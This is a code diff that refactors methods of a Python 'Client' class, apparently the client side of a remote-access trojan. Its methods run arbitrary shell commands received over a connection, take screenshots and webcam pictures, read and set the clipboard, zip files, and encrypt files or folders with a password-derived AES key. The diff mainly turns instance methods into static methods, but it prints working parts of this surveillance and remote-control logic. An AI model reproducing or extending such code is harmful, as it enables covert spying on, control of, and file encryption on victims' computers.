@@ -75,7 +75,8 @@ class Client:
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
 
-    def execute_command(self, response, command):
+    @staticmethod
+    def execute_command(response, command):
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                        stderr=subprocess.PIPE, universal_newlines=True)
@@ -106,7 +107,8 @@ class Client:
             response["error"] = "PermissionError"
         self.connection.send(response)
 
-    def capture_screenshot(self, response, monitor, path):
+    @staticmethod
+    def capture_screenshot(response, monitor, path):
         try:
             with mss.mss() as sct:
                 sct.shot(mon=int(monitor), output=path)
@@ -117,7 +119,8 @@ class Client:
         except FileNotFoundError:
             response["error"] = "FileNotFoundError"
 
-    def zip_file_or_folder(self, response, compression_level, path_to_open, path_to_save):
+    @staticmethod
+    def zip_file_or_folder(response, compression_level, path_to_open, path_to_save):
         try:
             zip_file = zipfile.ZipFile(path_to_save, "w", zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
             if os.path.isdir(path_to_open):
@@ -133,7 +136,8 @@ class Client:
         except FileNotFoundError:
             response["error"] = "FileNotFoundError"
 
-    def capture_camera_picture(self, response, camera_port, path_to_save):
+    @staticmethod
+    def capture_camera_picture(response, camera_port, path_to_save):
         video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
         if not video_capture.isOpened():
             response["error"] = "CouldNotOpenDevice"
@@ -158,14 +162,16 @@ class Client:
             else:
                 response["data"] = "stopped"
 
-    def edit_clipboard(self, response, content):
+    @staticmethod
+    def edit_clipboard(response, content):
         if content:
             clipboard.copy(content)
             response["data"] = ""
         else:
             response["data"] = clipboard.paste()
 
-    def crypt(self, response, action, path_to_open, password):
+    @staticmethod
+    def crypt(response, action, path_to_open, password):
         password_hash = hashlib.sha3_256(password.encode("utf8")).digest()
         crypter = AESGCM(password_hash)
         if os.path.isdir(path_to_open):
